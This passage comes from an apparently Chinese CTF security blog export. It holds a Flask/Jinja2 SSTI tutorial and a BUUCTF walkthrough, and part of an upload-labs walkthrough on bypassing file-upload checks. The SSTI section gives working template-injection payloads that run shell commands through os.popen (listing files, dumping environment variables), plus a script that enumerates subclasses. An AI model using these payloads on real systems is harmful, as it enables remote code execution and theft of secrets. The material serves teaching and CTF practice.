&#x27;generic_alias_iterator&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;sys.legacy_event_handler&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;line_iterator&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memory_iterator&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;positions_iterator&#x27;&gt;, &lt;class &#x27;str_ascii_iterator&#x27;&gt;, &lt;class &#x27;types.UnionType&#x27;&gt;, &lt;class &#x27;weakref.CallableProxyType&#x27;&gt;, &lt;class &#x27;weakref.ProxyType&#x27;&gt;, &lt;class &#x27;weakref.ReferenceType&#x27;&gt;, &lt;class &#x27;typing.TypeAliasType&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing.TypeVar&#x27;&gt;, &lt;class &#x27;typing.TypeVarTuple&#x27;&gt;, &lt;class &#x27;typing.ParamSpec&#x27;&gt;, &lt;class &#x27;typing.ParamSpecArgs&#x27;&gt;, &lt;class &#x27;typing.ParamSpecKwargs&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;_frozen_importlib._WeakValueDictionary&#x27;&gt;, &lt;class &#x27;_frozen_importlib._BlockingOnManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;winreg.PyHKEY&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Buffer&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;_winapi.Overlapped&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;os._AddedDllDirectory&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteCodec&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;_multibytecodec.MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.batched&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.pairwise&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;collections._deque_iterator&#x27;&gt;, &lt;class &#x27;collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.KeyWrapper&#x27;&gt;, &lt;class &#x27;functools._lru_list_elem&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib.AsyncContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;_virtualenv._Finder&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;enum.nonmember&#x27;&gt;, &lt;class &#x27;enum.member&#x27;&gt;, &lt;class &#x27;enum._auto_null&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;class &#x27;enum._proto_member&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;enum.verify&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;_sre.SRE_Template&#x27;&gt;, &lt;class &#x27;re._parser.State&#x27;&gt;, &lt;class &#x27;re._parser.SubPattern&#x27;&gt;, &lt;class &#x27;re._parser.Tokenizer&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;_tokenize.TokenizerIter&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;textwrap.TextWrapper&#x27;&gt;, &lt;class &#x27;traceback._Sentinel&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback._ExceptionPrintContext&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;]</span><br><span class="line">&lt;class &#x27;type&#x27;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">__class__<span class="comment">#查找该类为什么</span></span><br><span class="line">__base__<span class="comment">#查找该类的父类</span></span><br><span class="line">__mro__<span class="comment">#不断查找父类直到查找到object为止</span></span><br><span class="line">__subclasses__()<span class="comment">#查找该类下的所有子类我们可以在后面加上[index]通过改变index的参数来查找固定的类</span></span><br><span class="line">__init__<span class="comment">#初始化用于将查找到object下的子类模板初始化</span></span><br><span class="line">__globals__<span class="comment">#以字典的形式返回查询到的方法的属性等，字典类似于c的数组</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类，格式变量.__class__.__bases__[0].__subclasses__()</span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如变量.__class__.__bases__[0].__subclasses__()[1]</span><br></pre></td></tr></table></figure>
<h2 id="payload构造步骤"><a href="#payload构造步骤" class="headerlink" title="payload构造步骤"></a>payload构造步骤</h2><h3 id="1-寻找内置类所对应的类"><a href="#1-寻找内置类所对应的类" class="headerlink" title="1.寻找内置类所对应的类"></a>1.寻找内置类所对应的类</h3><p>使用<strong>class</strong>来获取内置类所对应的类；可以使用str、dict、tuple、list进行获取也就是可以将单引号改为<code>&quot;&quot;</code>,<code>[]</code>,<code>&#123;&#125;</code><br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-找到object"><a href="#2-找到object" class="headerlink" title="2.找到object"></a>2.找到object</h3><p>利用魔术方法<code>__base__</code>，<code>__mro__</code>来寻找<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__&#125;&#125;<span class="comment">#base要多个直到找到object为止</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx]&#125;&#125;<span class="comment">#选择最后一个父类的索引</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3-查找object下的所有子类"><a href="#3-查找object下的所有子类" class="headerlink" title="3.查找object下的所有子类"></a>3.查找object下的所有子类</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx].__subclasses()__&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-选择可以getshell的类"><a href="#4-选择可以getshell的类" class="headerlink" title="4.选择可以getshell的类"></a>4.选择可以getshell的类</h3><p>常用的为os._wrap_close<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx].__subclasses__()[xxx]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="5-调用getshell指令"><a href="#5-调用getshell指令" class="headerlink" title="5.调用getshell指令"></a>5.调用getshell指令</h3><p>我们将类进行初始化在查看器下面的所有方法<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="在方法里面直接寻找popen，eval等"><a href="#在方法里面直接寻找popen，eval等" class="headerlink" title="在方法里面直接寻找popen，eval等"></a>在方法里面直接寻找popen，eval等</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用模块builtins来进行"><a href="#使用模块builtins来进行" class="headerlink" title="使用模块builtins来进行"></a>使用模块<strong>builtins</strong>来进行</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="buuctf-flask-ssti"><a href="#buuctf-flask-ssti" class="headerlink" title="buuctf [flask]ssti"></a>buuctf [flask]ssti</h2><p>我们打开靶机，在url上输入?name=49回显49发现ssti漏洞<br>我们输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><br>打开源码ctrl+f搜索os._wrap_close发现存在这个类我们可以利用以下脚本来寻找该类的位置<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url=<span class="string">&quot;http://node5.buuoj.cn:29862/?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    r=requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><br>输出117<br>我们输入以下内容<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><br>同样搜索popen方法查看是否存在，<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/8.png" class="" title="Alt text"><br>其flag是存在于环境变量里，以下payload。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node5.buuoj.cn:29862/?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;env&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/9.png" class="" title="Alt text"><br>除了上面的还有以下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="常用模板"><a href="#常用模板" class="headerlink" title="常用模板"></a>常用模板</h2><h1 id="类的知识总结（转载"><a href="#类的知识总结（转载" class="headerlink" title="类的知识总结（转载)"></a>类的知识总结（转载)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g  </span><br></pre></td></tr></table></figure>
<h1 id="常见过滤器（转载）"><a href="#常见过滤器（转载）" class="headerlink" title="常见过滤器（转载）"></a>常见过滤器（转载）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的过滤器</span><br><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
        <category>ssti</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>think_php3.2.3的简单审计动调</title>
    <url>/2024/05/14/think-php3-2-3%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1%E5%8A%A8%E8%B0%83/</url>
    <content><![CDATA[<h1 id="因为在打hnctf的时候遇到了框架代审，当时我是直接通过日志泄露的payload来打的，所以我写下这篇文章来记录一下代审，顺便安装一下动调的环境。"><a href="#因为在打hnctf的时候遇到了框架代审，当时我是直接通过日志泄露的payload来打的，所以我写下这篇文章来记录一下代审，顺便安装一下动调的环境。" class="headerlink" title="因为在打hnctf的时候遇到了框架代审，当时我是直接通过日志泄露的payload来打的，所以我写下这篇文章来记录一下代审，顺便安装一下动调的环境。"></a>因为在打hnctf的时候遇到了框架代审，当时我是直接通过日志泄露的payload来打的，所以我写下这篇文章来记录一下代审，顺便安装一下动调的环境。</h1><h1 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a>exp注入</h1>]]></content>
      <categories>
        <category>php</category>
        <category>待审</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2023/12/15/upload-labs/</url>
    <content><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>WebShell是一种以asp、php、jsp或cgi等网页文件形式存在的代码执行环境，也可以称为一种网页后门。它具有以下特点：可以远程执行命令、上传下载文件、修改文件权限等。WebShell根据功能和特点可以分为不同的类型，包括内存马和WebShell管理工具</p>
<h1 id="关于文件上传漏洞"><a href="#关于文件上传漏洞" class="headerlink" title="关于文件上传漏洞"></a>关于文件上传漏洞</h1><p>文件上传漏洞主要是由于服务器端对用户上传的文件过滤不严导致被攻击者传入运行具有恶意代码的文件从而导致安全风险</p>
<h1 id="文件上传漏洞需要满足的条件"><a href="#文件上传漏洞需要满足的条件" class="headerlink" title="文件上传漏洞需要满足的条件"></a>文件上传漏洞需要满足的条件</h1><p>Web容器解释执行： 如果上传的文件能够被Web容器解释执行，特别是对于一些动态网页语言（如PHP、ASP、JSP等），攻击者可能通过上传包含恶意代码的文件来实现远程代码执行。这强调了对上传目录的权限和配置的重要性，确保攻击者无法直接上传并执行恶意脚本。</p>
<p>用户可通过Web访问： 文件上传漏洞的威胁在于攻击者能够通过Web访问上传的文件。如果文件上传成功但用户无法通过Web访问，那么漏洞的影响将受到限制。这也强调了对上传文件目录的访问权限和Web服务器配置的考虑。</p>
<p>内容修改和安全检查： 通过对上传的文件进行安全检查、格式化、图片压缩等操作，可以防止攻击者成功地执行某些类型的攻击。例如，通过在上传的图片中注入恶意代码来绕过检查并执行攻击。确保对上传文件进行严格的内容检查和处理是很关键的。</p>
<h1 id="一些变量"><a href="#一些变量" class="headerlink" title="一些变量"></a>一些变量</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;]  被上传文件的名称(文件在客户端机器上的原始名称。)</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;type&quot;]  被上传文件的MIME类型</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;size&quot;]  被上传文件的大小，以字节计</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]  存储在服务器的文件的临时副本的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;error&quot;]  由文件上传导致的错误代码</span><br></pre></td></tr></table></figure>
<h1 id="pass-01-前端绕过"><a href="#pass-01-前端绕过" class="headerlink" title="pass-01 前端绕过"></a>pass-01 前端绕过</h1><p>法一：这关我们打开f12就可以发现这是一个前端js书写的waf我们只需要在控制台禁用js就可以上传成功。<br><img src="/2023/12/15/upload-labs/less1-1.png" class="" title="Alt text"><br>法二：我们可以使用bp来对其进行抓包，我们先将一句话木马的后缀改为gif在上传对其进行抓包，抓包后我们在修改其文件的后缀名即可<br><img src="/2023/12/15/upload-labs/less1-2.png" class="" title="Alt text"><br>我们查看一下这个的拦截代码。学习一下<br><img src="/2023/12/15/upload-labs/less1-3.png" class="" title="Alt text"><br>我们可以看见document.getElementsByName(‘upload_file’)[0].value这串代码下面是解释<br>getElementsbyName的作用是通过表单名称也就是upload_file来获取元素，也就是你上传文件的一些信息<br>[0]： 这部分是数组索引，它选择了获取到的元素列表中的第一个元素。因为 getElementsByName 返回的是一个 NodeList（节点列表），即使只有一个元素也需要使用索引来访问。<br>.value： 一旦获取到元素，.value 用于获取该元素的值。对于文件上传表单元素，它将返回所选择的文件的路径。<br>综合起来，整行代码的目的是将文件上传表单中选择的文件的路径赋值给变量 file。这通常在文件上传验证的过程中用于检查用户是否选择了文件。值得注意的是，由于安全原因，浏览器不允许 JavaScript 直接访问文件路径的完整信息，因此实际上这只是返回了文件名而不是完整路径。</p>
<p>alert()函数是js代码弹出信息小窗口的函数</p>
<p>file.substring(file.lastIndexOf(“.”));<br>这串代码中lastIndex0f的作用是获取.最后一次出现的引索也就是最后一次出现的位置，file.lastIndexOf(“.”)就是获取file变量中.最后一次出现的位置，而substing()里面的变量若为一个则返回该位置到末尾的字符串<br>综合起来，file.substring(file.lastIndexOf(“.”)) 会提取文件名中的文件扩展名。例如，如果 file 是 “example.jpg”，那么这个代码将返回 “.jpg”。这对于在文件上传时验证文件类型是非常有用的。</p>
<p>allow_ext.indexOf(ext_name + “|”)： indexOf 是字符串方法，用于查找字符串中是否包含指定的子字符串。在这里，它查找 allow_ext 中是否包含 ext_name + “|” 这个子字符串。ext_name 是上传文件的扩展名，然后在其后面添加一个竖线 “|”。这是为了确保只有完整的扩展名匹配，而不是部分匹配。</p>
<p>== -1： 如果 indexOf 方法没有找到匹配的子字符串，它将返回 -1。因此，allow_ext.indexOf(ext_name + “|”) == -1 表示上传文件的扩展名不在允许上传的文件类型列表中。</p>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p> 这道题目考察的MIME绕过。<br> MIME是一种标识文件类型的标准。其标识分为：<br> <strong>主类型：描述了文件的大类如：文本，音乐，图片等</strong><br> <strong>小类型：表示精确到文件的具体类型</strong><br> 如：<br>文本文件的 MIME 类型是 text/plain。<br>JPEG 图片的 MIME 类型是 image/jpeg。<br>MP3 音频的 MIME 类型是 audio/mp3。<br>在文件上传和下载、Web 开发等场景中，MIME 类型的正确设置对于确保文件按预期方式处理和显示至关重要。例如，在 Web 开发中，服务器通过设置 HTTP 头部中的 Content-Type 字段来指定响应的 MIME 类型。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>通过上述的描述我们可以知道MIME在web中是通过http的请求头中的Content-Type来指定类型的，也就是说我们可以进行抓包从而修改Content-Type的值从而修改后端所识别的MIME。</p>
<h3 id="上传姿势一"><a href="#上传姿势一" class="headerlink" title="上传姿势一"></a>上传姿势一</h3><p>我们可以直接上传后缀名被修改为jpg的一句话木马，在抓包软件中对其后缀名进行修改。<br><img src="/2023/12/15/upload-labs/2-1.png" class="" title="Alt text"><br>我们可以看见其标头Content-Type为image/jpeg我们将文件的后缀名进行修改，成功绕过。那么也就证明了后端值查询标头传入的内容而不直接查询文件。这就是MIME的弊端</p>
